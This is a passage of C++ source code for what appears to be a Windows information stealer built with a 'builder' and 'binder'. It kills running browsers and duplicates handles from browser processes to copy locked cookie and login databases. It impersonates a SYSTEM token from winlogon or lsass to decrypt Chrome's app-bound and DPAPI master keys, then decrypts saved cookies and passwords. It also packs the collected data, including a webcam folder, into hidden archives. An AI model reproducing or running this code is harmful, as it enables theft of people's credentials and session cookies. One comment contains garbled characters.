    CreateDirectoryA(tempDir.c_str(), nullptr);

    for (auto& f : files) {
        if (f.second.empty()) continue;
        std::string rel = f.first;
        for (char& c : rel) if (c == '/') c = '\\';
        std::string filePath = tempDir + "\\" + rel;
        size_t slash = filePath.rfind('\\');
        if (slash != std::string::npos)
            SHCreateDirectoryExA(nullptr, filePath.substr(0, slash).c_str(), nullptr);
        std::ofstream file(filePath, std::ios::binary);
        if (file.is_open()) {
            file.write(f.second.data(), (std::streamsize)f.second.size());
            file.close();
        }
    }

    std::string archiveBase = getTempDir() + "data_" + std::to_string(GetTickCount());
    bool archiveCreated = false;

    // An empty password means "write the archive with no encryption", which is
    // what the builder asks for when Configure password is on but the field was
    // left blank. Omitting -p entirely is the only correct way to express that;
    // passing -p"" would fail or produce a password-protected archive with an
    // empty password.
    const bool encrypt = !password.empty();
    const std::string pwFlag = encrypt ? (" -p\"" + password + "\"") : std::string();

    // Archive FROM inside tempDir so folder names (browser_data, webcam, ...) are preserved.
    // Never use WinRAR -ep (it strips all paths).
    std::vector<std::string> rarPaths = {
        "C:\\Program Files\\WinRAR\\rar.exe",
        "C:\\Program Files (x86)\\WinRAR\\rar.exe"
    };
    for (auto& rar : rarPaths) {
        if (GetFileAttributesA(rar.c_str()) != INVALID_FILE_ATTRIBUTES) {
            std::string outRar = archiveBase + ".rar";
            std::string cmd = "\"" + rar + "\" a -r -ep1" + pwFlag + " \"" + outRar + "\" *";
            if (runProcessHidden(cmd, tempDir)) {
                outExtension = "rar";
                archiveCreated = true;
                break;
            }
        }
    }

    if (!archiveCreated) {
        std::vector<std::string> sevenZipPaths = {
            "C:\\Program Files\\7-Zip\\7z.exe",
            "C:\\Program Files (x86)\\7-Zip\\7z.exe"
        };
        for (auto& sz : sevenZipPaths) {
            if (GetFileAttributesA(sz.c_str()) != INVALID_FILE_ATTRIBUTES) {
                std::string outZip = archiveBase + ".zip";
                std::string cmd = "\"" + sz + "\" a -r" + pwFlag + " -mhe=off \"" + outZip + "\" *";
                if (runProcessHidden(cmd, tempDir)) {
                    outExtension = "zip";
                    archiveCreated = true;
                    break;
                }
            }
        }
    }

    if (!archiveCreated) {
        std::string outZip = archiveBase + ".zip";
        std::string cmd = "powershell -NoProfile -WindowStyle Hidden -Command \"Compress-Archive -Path * -DestinationPath '" + outZip + "' -Force\"";
        if (runProcessHidden(cmd, tempDir)) {
            outExtension = "zip";
            archiveCreated = true;
        }
    }

    if (archiveCreated) {
        std::string archivePath = archiveBase + "." + outExtension;
        result = readFileToVector(archivePath);
        DeleteFileA(archivePath.c_str());
    }

    deleteTree(tempDir);
    return result;
}

// === Feature: Grab browser data ===

static bool pathExists(const std::string& path) {
    return GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES;
}

static std::string firstExistingPath(const std::vector<std::string>& paths) {
    for (const auto& p : paths) {
        if (pathExists(p))
            return p;
    }
    return paths.empty() ? std::string() : paths.front();
}

static std::string getDefaultBrowserName() {
    HKEY hKey;
    char buf[MAX_PATH] = "";
    DWORD bufSize = sizeof(buf);
    DWORD type = 0;

    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "ProgId", nullptr, &type, (BYTE*)buf, &bufSize) != ERROR_SUCCESS)
            buf[0] = 0;
        RegCloseKey(hKey);
    }

    if (buf[0] == 0) {
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.html\\UserChoice",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            bufSize = sizeof(buf);
            if (RegQueryValueExA(hKey, "ProgId", nullptr, &type, (BYTE*)buf, &bufSize) != ERROR_SUCCESS)
                buf[0] = 0;
            RegCloseKey(hKey);
        }
    }

    if (buf[0] == 0) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\http\\shell\\open\\command",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            bufSize = sizeof(buf);
            if (RegQueryValueExA(hKey, nullptr, nullptr, &type, (BYTE*)buf, &bufSize) != ERROR_SUCCESS)
                buf[0] = 0;
            RegCloseKey(hKey);
        }
    }

    std::string progId(buf);
    std::transform(progId.begin(), progId.end(), progId.begin(), ::tolower);

    char localAppData[MAX_PATH] = {};
    char roamingAppData[MAX_PATH] = {};
    SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, roamingAppData);

    // Opera GX shares ProgId with Opera ("OperaStable") Ä‚â€žĂ˘â‚¬ĹˇÄ‚â€ąĂ‚ÂĂ„â€šĂ‹ÂÄ‚ËĂ˘â€šÂ¬ÄąË‡Ä‚â€šĂ‚Â¬Ă„â€šĂ‹ÂÄ‚ËĂ˘â‚¬ĹˇĂ‚Â¬Ă„Ä…Ă„â€ž distinguish by profile folder / install path
    auto isOperaGxInstalled = [&]() -> bool {
        return pathExists(std::string(roamingAppData) + "\\Opera Software\\Opera GX Stable") ||
               pathExists(std::string(localAppData) + "\\Opera Software\\Opera GX Stable") ||
               progId.find("gx") != std::string::npos ||
               progId.find("launcher") != std::string::npos;
    };

    if (progId.find("chrome") != std::string::npos || progId.find("chromium") != std::string::npos)
        return "Chrome";
    if (progId.find("msedge") != std::string::npos || progId.find("edge") != std::string::npos)
        return "Edge";
    if (progId.find("firefox") != std::string::npos || progId.find("mozilla") != std::string::npos)
        return "Firefox";
    if (progId.find("brave") != std::string::npos)
        return "Brave";
    if (progId.find("opera") != std::string::npos) {
        if (isOperaGxInstalled())
            return "Opera GX";
        return "Opera";
    }

    // If no ProgId match, prefer installed browser with profile data
    if (pathExists(std::string(roamingAppData) + "\\Opera Software\\Opera GX Stable") ||
        pathExists(std::string(localAppData) + "\\Opera Software\\Opera GX Stable"))
        return "Opera GX";
    if (pathExists(std::string(localAppData) + "\\Google\\Chrome\\User Data\\Default"))
        return "Chrome";
    if (pathExists(std::string(localAppData) + "\\Microsoft\\Edge\\User Data\\Default"))
        return "Edge";

    return "Chrome";
}

static std::string getBrowserUserDataRoot(const std::string& browser) {
    char localAppData[MAX_PATH] = {};
    char roamingAppData[MAX_PATH] = {};
    SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, roamingAppData);

    if (browser == "Chrome")
        return std::string(localAppData) + "\\Google\\Chrome\\User Data";
    if (browser == "Edge")
        return std::string(localAppData) + "\\Microsoft\\Edge\\User Data";
    if (browser == "Brave")
        return std::string(localAppData) + "\\BraveSoftware\\Brave-Browser\\User Data";
    if (browser == "Firefox")
        return std::string(roamingAppData) + "\\Mozilla\\Firefox\\Profiles";
    if (browser == "Opera GX") {
        return firstExistingPath({
            std::string(roamingAppData) + "\\Opera Software\\Opera GX Stable",
            std::string(localAppData) + "\\Opera Software\\Opera GX Stable"
        });
    }
    if (browser == "Opera") {
        return firstExistingPath({
            std::string(roamingAppData) + "\\Opera Software\\Opera Stable",
            std::string(localAppData) + "\\Opera Software\\Opera Stable"
        });
    }
    return std::string(localAppData) + "\\Google\\Chrome\\User Data";
}

// Profile folder with cookies/history. Opera stores Local State in root and data in Default.
static std::string getBrowserProfilePath(const std::string& browser) {
    std::string root = getBrowserUserDataRoot(browser);
    if (browser == "Firefox")
        return root;
    std::string def = root + "\\Default";
    if (pathExists(def))
        return def;
    return root;
}

static void enablePrivilege(const char* name) {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return;
    TOKEN_PRIVILEGES tp = {};
    if (LookupPrivilegeValueA(nullptr, name, &tp.Privileges[0].Luid)) {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    }
    CloseHandle(hToken);
}

static bool streamCopyHandles(HANDLE hSrc, HANDLE hDst) {
    SetFilePointer(hSrc, 0, nullptr, FILE_BEGIN);
    char buffer[65536];
    DWORD read = 0, written = 0;
    while (ReadFile(hSrc, buffer, sizeof(buffer), &read, nullptr) && read > 0) {
        if (!WriteFile(hDst, buffer, read, &written, nullptr) || written != read)
            return false;
    }
    return true;
}

static std::string normalizePathLower(std::string p) {
    for (char& c : p) {
        if (c == '/') c = '\\';
        c = (char)tolower((unsigned char)c);
    }
    // strip \\?\ prefix
    if (p.rfind("\\\\?\\", 0) == 0)
        p = p.substr(4);
    return p;
}

static std::string handlePathA(HANDLE h) {
    wchar_t wbuf[MAX_PATH * 4] = {};
    // flags=0 matches working handle-dup tests
    DWORD n = GetFinalPathNameByHandleW(h, wbuf, (DWORD)(sizeof(wbuf) / sizeof(wbuf[0])), 0);
    if (n == 0 || n >= sizeof(wbuf) / sizeof(wbuf[0]))
        return {};
    char abuf[MAX_PATH * 4] = {};
    WideCharToMultiByte(CP_ACP, 0, wbuf, -1, abuf, sizeof(abuf), nullptr, nullptr);
    return normalizePathLower(abuf);
}

static bool sameFilePath(const std::string& a, const std::string& b) {
    if (a == b) return true;
    if (a.empty() || b.empty()) return false;
    if (a.size() >= b.size())
        return a.compare(a.size() - b.size(), b.size(), b) == 0 &&
               (a.size() == b.size() || a[a.size() - b.size() - 1] == '\\');
    return b.compare(b.size() - a.size(), a.size(), a) == 0 &&
           (b.size() == a.size() || b[b.size() - a.size() - 1] == '\\');
}

// Find PIDs locking a path via Restart Manager (fast, no full handle table scan).
static std::vector<DWORD> findLockingPids(const std::string& path) {
    std::vector<DWORD> pids;
    typedef DWORD(WINAPI* RmStartSession_t)(DWORD*, DWORD, WCHAR*);
    typedef DWORD(WINAPI* RmEndSession_t)(DWORD);
    typedef DWORD(WINAPI* RmRegisterResources_t)(DWORD, UINT, LPCWSTR*, UINT, void*, UINT, LPCWSTR*);
    typedef DWORD(WINAPI* RmGetList_t)(DWORD, UINT*, UINT*, void*, LPDWORD);

    HMODULE hRm = LoadLibraryA("RstrtMgr.dll");
    if (!hRm) return pids;
    auto pStart = (RmStartSession_t)GetProcAddress(hRm, "RmStartSession");
    auto pEnd = (RmEndSession_t)GetProcAddress(hRm, "RmEndSession");
    auto pReg = (RmRegisterResources_t)GetProcAddress(hRm, "RmRegisterResources");
    auto pList = (RmGetList_t)GetProcAddress(hRm, "RmGetList");
    if (!pStart || !pEnd || !pReg || !pList) {
        FreeLibrary(hRm);
        return pids;
    }

    DWORD session = 0;
    WCHAR key[CCH_RM_SESSION_KEY + 1] = {};
    if (pStart(&session, 0, key) != ERROR_SUCCESS) {
        FreeLibrary(hRm);
        return pids;
    }

    wchar_t wpath[MAX_PATH * 2] = {};
    MultiByteToWideChar(CP_ACP, 0, path.c_str(), -1, wpath, MAX_PATH * 2);
    LPCWSTR files[1] = { wpath };
    if (pReg(session, 1, files, 0, nullptr, 0, nullptr) == ERROR_SUCCESS) {
        UINT needed = 0, count = 0;
        DWORD reason = 0;
        DWORD rc = pList(session, &needed, &count, nullptr, &reason);
        if ((rc == ERROR_MORE_DATA || rc == ERROR_SUCCESS) && needed > 0) {
            std::vector<BYTE> buf(needed * sizeof(RM_PROCESS_INFO));
            count = needed;
            if (pList(session, &needed, &count, buf.data(), &reason) == ERROR_SUCCESS) {
                auto* infos = (RM_PROCESS_INFO*)buf.data();
                for (UINT i = 0; i < count; i++)
                    pids.push_back(infos[i].Process.dwProcessId);
            }
        }
    }
    pEnd(session);
    FreeLibrary(hRm);
    return pids;
}

// Brave exclusive-locks Network\Cookies. Duplicate the open handle from the locking process only.
static bool copyFileViaHandleDup(const std::string& src, const std::string& dst) {
    typedef LONG NTSTATUS;
    typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return false;
    auto NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) return false;

    enablePrivilege("SeDebugPrivilege");
    enablePrivilege("SeBackupPrivilege");

    std::string target = normalizePathLower(src);
    char full[MAX_PATH * 2] = {};
    if (GetFullPathNameA(src.c_str(), sizeof(full), full, nullptr))
        target = normalizePathLower(full);

    std::vector<DWORD> pids = findLockingPids(src);
    if (pids.empty()) {
        // fallback: browser process names (may be slower)
        const wchar_t* names[] = {
            L"brave.exe", L"chrome.exe", L"msedge.exe", L"opera.exe",
            L"vivaldi.exe", L"browser.exe", L"chromium.exe", nullptr
        };
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = {};
            pe.dwSize = sizeof(pe);
            if (Process32FirstW(snap, &pe)) {
                do {
                    for (int i = 0; names[i]; i++) {
                        if (_wcsicmp(pe.szExeFile, names[i]) == 0) {
                            pids.push_back(pe.th32ProcessID);
                            break;
                        }
                    }
                } while (Process32NextW(snap, &pe));
            }
            CloseHandle(snap);
        }
    }
    if (pids.empty()) return false;

    // Open each locker once
    std::map<DWORD, HANDLE> procs;
    for (DWORD pid : pids) {
        if (procs.count(pid)) continue;
        HANDLE h = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
        if (h) procs[pid] = h;
    }
    if (procs.empty()) return false;

    const ULONG SystemExtendedHandleInformation = 64;
    ULONG bufSize = 1 << 22;
    std::vector<BYTE> buf(bufSize);
    NTSTATUS st = -1;
    for (int attempt = 0; attempt < 8; attempt++) {
        ULONG ret = 0;
        st = NtQuerySystemInformation(SystemExtendedHandleInformation, buf.data(), bufSize, &ret);
        if (st == 0) break;
        if (ret > bufSize) bufSize = ret + (1 << 16);
        else bufSize *= 2;
        buf.resize(bufSize);
    }
    if (st != 0) {
        for (auto& kv : procs) CloseHandle(kv.second);
        return false;
    }

#pragma pack(push, 8)
    struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
        PVOID Object;
        ULONG_PTR UniqueProcessId;
        ULONG_PTR HandleValue;
        ULONG GrantedAccess;
        USHORT CreatorBackTraceIndex;
        USHORT ObjectTypeIndex;
        ULONG HandleAttributes;
        ULONG Reserved;
    };
    struct SYSTEM_HANDLE_INFORMATION_EX {
        ULONG_PTR NumberOfHandles;
        ULONG_PTR Reserved;
        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
    };
#pragma pack(pop)

    auto* info = (SYSTEM_HANDLE_INFORMATION_EX*)buf.data();
    bool okCopy = false;

    for (ULONG_PTR i = 0; i < info->NumberOfHandles && !okCopy; i++) {
        auto& e = info->Handles[i];
        DWORD pid = (DWORD)e.UniqueProcessId;
        auto it = procs.find(pid);
        if (it == procs.end()) continue;

        HANDLE hDup = nullptr;
        if (!DuplicateHandle(it->second, (HANDLE)e.HandleValue, GetCurrentProcess(), &hDup,
            0, FALSE, DUPLICATE_SAME_ACCESS)) {
            continue;
        }
        if (!hDup || hDup == INVALID_HANDLE_VALUE)
            continue;

        std::string path = handlePathA(hDup);
        if (path.empty() || !sameFilePath(path, target)) {
            CloseHandle(hDup);
            continue;
        }

        HANDLE hDst = CreateFileA(dst.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hDst == INVALID_HANDLE_VALUE) {
            CloseHandle(hDup);
            break;
        }
        okCopy = streamCopyHandles(hDup, hDst);
        CloseHandle(hDst);
        CloseHandle(hDup);
        if (!okCopy)
            DeleteFileA(dst.c_str());
    }

    for (auto& kv : procs) CloseHandle(kv.second);
    return okCopy;
}

static bool copyFileWithRetry(const std::string& src, const std::string& dst, int retries = 8) {
    enablePrivilege("SeBackupPrivilege");
    for (int i = 0; i < retries; i++) {
        if (CopyFileA(src.c_str(), dst.c_str(), FALSE))
            return true;

        HANDLE hSrc = CreateFileA(src.c_str(), GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hSrc == INVALID_HANDLE_VALUE) {
            hSrc = CreateFileA(src.c_str(), GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);
        }
        if (hSrc != INVALID_HANDLE_VALUE) {
            HANDLE hDst = CreateFileA(dst.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hDst != INVALID_HANDLE_VALUE) {
                BOOL ok = streamCopyHandles(hSrc, hDst);
                CloseHandle(hDst);
                CloseHandle(hSrc);
                if (ok)
                    return true;
                DeleteFileA(dst.c_str());
            } else {
                CloseHandle(hSrc);
            }
        }
        Sleep(200);
    }

    // Brave exclusive-locks Network\Cookies — duplicate open handle from browser process
    return copyFileViaHandleDup(src, dst);
}

// Chrome/Edge lock Cookies hard while running — force close before grab
static void closeBrowserProcesses() {
    const wchar_t* targets[] = {
        L"chrome.exe", L"msedge.exe", L"brave.exe", L"opera.exe",
        L"opera_gx.exe", L"vivaldi.exe", L"chromium.exe", L"browser.exe",
        nullptr
    };
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            for (int i = 0; targets[i]; i++) {
                if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
                    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (h) {
                        TerminateProcess(h, 0);
                        CloseHandle(h);
                    }
                    break;
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    Sleep(800);
}

static std::vector<std::string> getChromiumDataFiles(const std::string& profilePath, const std::string& userDataRoot) {
    return {
        profilePath + "\\Network\\Cookies",
        profilePath + "\\Cookies",
        profilePath + "\\Login Data",
        profilePath + "\\Login Data For Account",
        profilePath + "\\History",
        profilePath + "\\Web Data",
        profilePath + "\\Bookmarks",
        profilePath + "\\Preferences",
        userDataRoot + "\\Local State",
        profilePath + "\\Local State"
    };
}

static std::string sanitizeFolderName(std::string s) {
    for (char& c : s) {
        if (c == ' ' || c == '/' || c == '\\' || c == ':' || c == '*' || c == '?' || c == '"' || c == '<' || c == '>' || c == '|')
            c = '_';
    }
    return s;
}

static std::string base64Decode(const std::string& in) {
    DWORD needed = 0;
    if (!CryptStringToBinaryA(in.c_str(), (DWORD)in.size(), CRYPT_STRING_BASE64, nullptr, &needed, nullptr, nullptr))
        return {};
    std::string out(needed, '\0');
    if (!CryptStringToBinaryA(in.c_str(), (DWORD)in.size(), CRYPT_STRING_BASE64, (BYTE*)&out[0], &needed, nullptr, nullptr))
        return {};
    out.resize(needed);
    return out;
}

static std::vector<BYTE> dpapiDecrypt(const BYTE* data, DWORD len) {
    DATA_BLOB in = {};
    in.pbData = (BYTE*)data;
    in.cbData = len;
    DATA_BLOB out = {};
    if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out))
        return {};
    std::vector<BYTE> res(out.pbData, out.pbData + out.cbData);
    LocalFree(out.pbData);
    return res;
}

static bool enablePrivilege(LPCWSTR name) {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    TOKEN_PRIVILEGES tp = {};
    if (!LookupPrivilegeValueW(nullptr, name, &tp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return false;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    DWORD err = GetLastError();
    CloseHandle(hToken);
    return err != ERROR_NOT_ALL_ASSIGNED;
}

static std::vector<BYTE> dpapiDecryptAsSystem(const BYTE* data, DWORD len) {
    if (!data || !len) return {};
    enablePrivilege(L"SeDebugPrivilege");

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return {};

    DWORD systemPid = 0;
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0 ||
                _wcsicmp(pe.szExeFile, L"lsass.exe") == 0 ||
                _wcsicmp(pe.szExeFile, L"services.exe") == 0) {
                systemPid = pe.th32ProcessID;
                if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0)
                    break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    if (!systemPid) return {};

    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, systemPid);
    if (!hProc)
        hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, systemPid);
    if (!hProc) return {};

    HANDLE hToken = nullptr, hDup = nullptr;
    std::vector<BYTE> res;
    if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nullptr, SecurityImpersonation, TokenImpersonation, &hDup)) {
            if (SetThreadToken(nullptr, hDup) || ImpersonateLoggedOnUser(hDup)) {
                res = dpapiDecrypt(data, len);
                RevertToSelf();
            }
            CloseHandle(hDup);
        }
        CloseHandle(hToken);
    }
    CloseHandle(hProc);
    return res;
}

static std::string extractJsonString(const std::string& json, const std::string& key) {
    std::string tag = "\"" + key + "\":\"";
    size_t p = json.find(tag);
    if (p == std::string::npos) {
        tag = "\"" + key + "\": \"";
        p = json.find(tag);
        if (p == std::string::npos) return {};
    }
    p += tag.size();
    size_t e = json.find('"', p);
    if (e == std::string::npos) return {};
    return json.substr(p, e - p);
}

static std::vector<BYTE> extractAppBoundKeyBytes(const std::vector<BYTE>& plain) {
    if (plain.size() < 16) return {};
    if (plain.size() >= 8) {
        DWORD valLen = 0;
        memcpy(&valLen, plain.data(), 4);
        if (valLen < plain.size() && (size_t)4 + valLen + 4 <= plain.size()) {
            DWORD keyLen = 0;
            memcpy(&keyLen, plain.data() + 4 + valLen, 4);
            size_t keyOff = (size_t)4 + valLen + 4;
            if (keyLen >= 16 && keyLen <= 64 && keyOff + keyLen <= plain.size())
                return std::vector<BYTE>(plain.begin() + keyOff, plain.begin() + keyOff + keyLen);
        }
    }
    if (plain.size() >= 32)
        return std::vector<BYTE>(plain.end() - 32, plain.end());
    return plain;
}

static std::vector<BYTE> getAppBoundKeyAdmin(const std::string& userDataRoot) {
    std::string localState = userDataRoot + "\\Local State";
    if (!pathExists(localState)) return {};
    auto raw = readFileToVector(localState);
    if (raw.empty()) return {};
    std::string json(raw.begin(), raw.end());
    std::string b64 = extractJsonString(json, "app_bound_encrypted_key");
    if (b64.empty()) return {};
    std::string decoded = base64Decode(b64);
    if (decoded.size() < 8) return {};

    const BYTE* blob = (const BYTE*)decoded.data();
    DWORD blobLen = (DWORD)decoded.size();
    if (decoded.size() >= 4 && decoded.compare(0, 4, "APPB") == 0) {
        blob += 4;
        blobLen -= 4;
    }

    // Retry up to 5 times with increasing delays — DPAPI may not be ready at boot
    for (int attempt = 0; attempt < 5; attempt++) {
        if (attempt > 0)
            Sleep((DWORD)(2000 + attempt * 1500));

        auto step1 = dpapiDecryptAsSystem(blob, blobLen);
        if (step1.empty()) {
            step1 = dpapiDecrypt(blob, blobLen);
            if (step1.empty()) continue;
        }
        auto step2 = dpapiDecrypt(step1.data(), (DWORD)step1.size());
        if (step2.empty()) {
            auto key = extractAppBoundKeyBytes(step1);
            if (!key.empty()) return key;
            continue;
        }
        auto key = extractAppBoundKeyBytes(step2);
        if (!key.empty()) return key;
    }
    return {};
}

// IElevator COM path disabled: wrong vtable offsets crash (0xC0000005).
// Admin SYSTEM+user DPAPI is the reliable path with binder requireAdministrator.
static std::vector<BYTE> getAppBoundKeyViaElevator(const std::string&, const std::string&) {
    return {};
}

static std::vector<BYTE> getChromiumMasterKey(const std::string& userDataRoot) {
    std::string localState = userDataRoot + "\\Local State";
    if (!pathExists(localState)) return {};
    auto raw = readFileToVector(localState);
    if (raw.empty()) return {};
    std::string json(raw.begin(), raw.end());
    std::string b64 = extractJsonString(json, "encrypted_key");
    if (b64.empty()) return {};
    std::string decoded = base64Decode(b64);
    if (decoded.size() < 5) return {};
    if (decoded.compare(0, 5, "DPAPI") == 0)
        decoded = decoded.substr(5);
    return dpapiDecrypt((const BYTE*)decoded.data(), (DWORD)decoded.size());
}

static std::vector<BYTE> getChromiumAppBoundKey(const std::string& /*browserName*/, const std::string& userDataRoot) {
    // Requires elevation (SYSTEM DPAPI). Binder already forces admin.
    return getAppBoundKeyAdmin(userDataRoot);
}

// AES-GCM for v10/v11/v20: prefix(3) + nonce(12) + cipher + tag(16)
static std::string aesGcmDecryptRaw(const std::vector<BYTE>& masterKey, const BYTE* blob, int blobLen) {
    if (!blob || blobLen < 3 + 12 + 16 || masterKey.empty()) return {};
    bool okPrefix =
        (blob[0] == 'v' && blob[1] == '1' && (blob[2] == '0' || blob[2] == '1')) ||
        (blob[0] == 'v' && blob[1] == '2' && blob[2] == '0');
    if (!okPrefix) return {};

    const BYTE* nonce = blob + 3;
    int cipherLen = blobLen - 3 - 12 - 16;
    if (cipherLen < 0) return {};
    const BYTE* cipher = blob + 3 + 12;
    const BYTE* tag = blob + blobLen - 16;

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0)
        return {};
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
            (ULONG)sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0,
            (PUCHAR)masterKey.data(), (ULONG)masterKey.size(), 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)nonce;
    authInfo.cbNonce = 12;
    authInfo.pbTag = (PUCHAR)tag;
    authInfo.cbTag = 16;

    std::vector<BYTE> plain((size_t)cipherLen + 16);
    ULONG outLen = 0;
    NTSTATUS st = BCryptDecrypt(hKey, (PUCHAR)cipher, (ULONG)cipherLen, &authInfo,
        nullptr, 0, plain.data(), (ULONG)plain.size(), &outLen, 0);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    if (st != 0 || outLen == 0) return {};
    plain.resize(outLen);
    while (!plain.empty() && plain.back() == 0) plain.pop_back();
    return std::string(plain.begin(), plain.end());
}

static std::string aesGcmDecrypt(const std::vector<BYTE>& masterKey, const BYTE* blob, int blobLen) {
    return aesGcmDecryptRaw(masterKey, blob, blobLen);
}

static bool looksLikeText(const std::string& s) {
    if (s.empty()) return false;
    size_t printable = 0;
    for (unsigned char c : s) {
        if (c >= 32 && c < 127) printable++;
        else if (c == '\t' || c == '\n' || c == '\r') printable++;
    }
    return printable * 100 / s.size() >= 85;
}

static std::string sanitizeDecrypted(std::string s) {
    while (!s.empty() && (s.back() == '\0' || (unsigned char)s.back() < 32))
        s.pop_back();
    if (s.empty()) return s;

    size_t bad = 0;
    for (unsigned char c : s) if (c < 32 || c >= 127) bad++;
    if (bad == 0) return s;

    // cookies v20 often have 32-byte binary prefix after AES
    if (s.size() > 32) {
        std::string tail = s.substr(32);
        size_t tbad = 0;
        for (unsigned char c : tail) if (c < 32 || c >= 127) tbad++;
        if (tbad == 0 && tail.size() >= 4) return tail;
    }

    size_t afterBin = 0;
    for (size_t i = 0; i < s.size(); i++) {
        unsigned char c = (unsigned char)s[i];
        if (c < 32 || c >= 127) afterBin = i + 1;
    }
    if (afterBin > 0 && afterBin < s.size()) {
        std::string tail = s.substr(afterBin);
        if (looksLikeText(tail) && tail.size() >= 4) return tail;
    }

    std::string stripped;
    for (unsigned char c : s)
        if (c >= 32 && c < 127) stripped.push_back((char)c);
    if (stripped.size() >= 4) return stripped;
    return s;
}

static std::string decryptChromiumValue(
    const std::vector<BYTE>& masterKey,
    const std::vector<BYTE>& appBoundKey,
    const BYTE* blob, int blobLen,
    bool cookieStyle = false)
{
    if (!blob || blobLen <= 0) return {};

    // v10 / v11 with classic DPAPI master key
    if (blobLen >= 3 && blob[0] == 'v' && blob[1] == '1' && (blob[2] == '0' || blob[2] == '1')) {
        std::string r = aesGcmDecryptRaw(masterKey, blob, blobLen);
        if (!r.empty()) return sanitizeDecrypted(std::move(r));
        return {};
    }

    // v20 app-bound AES key
    if (blobLen >= 3 && blob[0] == 'v' && blob[1] == '2' && blob[2] == '0') {
        if (appBoundKey.size() >= 16) {
            std::string r = aesGcmDecryptRaw(appBoundKey, blob, blobLen);
            if (!r.empty()) {
                // cookie plaintext has 32-byte header
                if (cookieStyle && r.size() > 32)
